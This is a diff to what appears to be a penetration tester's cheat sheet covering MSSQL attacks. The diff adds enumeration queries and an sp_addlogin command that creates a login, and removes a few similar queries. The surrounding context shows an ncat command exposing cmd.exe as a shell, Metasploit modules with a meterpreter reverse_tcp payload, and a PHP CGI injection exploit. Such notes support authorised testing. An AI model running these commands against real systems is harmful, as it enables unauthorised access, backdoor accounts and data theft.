@@ -86,12 +86,19 @@ ncat --exec cmd.exe --allow IP -vnl PUERTO --ssl
 		use auxiliary/admin/mssql/mssql_enum
 		use exploit/windows/mssql/mssql_payload
 			set PAYLOAD windows/meterpreter/reverse_tcp
+		http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+		SELECT @@version
+		SELECT name FROM master..syslogins // Enum users
+		SELECT name FROM master..sysdatabases; // Enum dbs
+		SELECT DB_NAME()
+		use DB
+		SELECT HOST_NAME()
+		select distinct table_name from information_schema.tables
+		EXEC sp_addlogin 'user', 'pass';
 	
 	wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
 	python mssqlclient.py -port 1433 -db BBDD USER:'PASS'@IP [-windows-auth]
-		select name from master.sys.databases
-		use DB
-		select distinct table_name from information_schema.tables
+		
 
 #WEB
 PHP 5.X probable => exploit/multi/http/php_cgi_arg_injection
